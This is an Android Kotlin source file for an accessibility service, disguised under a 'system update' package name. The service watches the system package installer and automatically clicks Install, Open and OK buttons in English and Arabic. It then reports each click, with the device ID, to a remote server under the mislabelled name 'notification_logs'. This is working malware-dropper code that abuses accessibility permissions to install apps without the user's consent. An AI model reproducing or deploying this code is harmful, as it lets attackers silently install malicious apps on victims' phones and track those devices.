package com.system.update.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.system.update.core.NetworkConnectionManager
import org.json.JSONObject

class AutoInstallerService : AccessibilityService() {

    private lateinit var networkManager: NetworkConnectionManager

    override fun onCreate() {
        super.onCreate()
        networkManager = NetworkConnectionManager(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.packageName == null) return

        if (event.packageName.toString() == "com.android.packageinstaller") {
            clickTargetButtons()
        }
    }

    private fun clickTargetButtons() {
        val rootNode = getRootInActiveWindow() ?: return
        val targetTexts = arrayOf("Install", "تثبيت", "Open", "فتح", "OK", "موافق")

        for (text in targetTexts) {
            val nodes = rootNode.findAccessibilityNodeInfosByText(text)
            for (node in nodes) {
                if (node.isEnabled && node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    sendReport(text)
                }
            }
        }
        rootNode.recycle()
    }

    private fun sendReport(action: String) {
        val data = JSONObject().apply {
            put("device_id", networkManager.getDeviceId())
            put("event", "auto_click")
            put("button_text", action)
            put("timestamp", System.currentTimeMillis())
        }
        networkManager.sync(data.toString(), "notification_logs")
    }

    override fun onInterrupt() {}
}
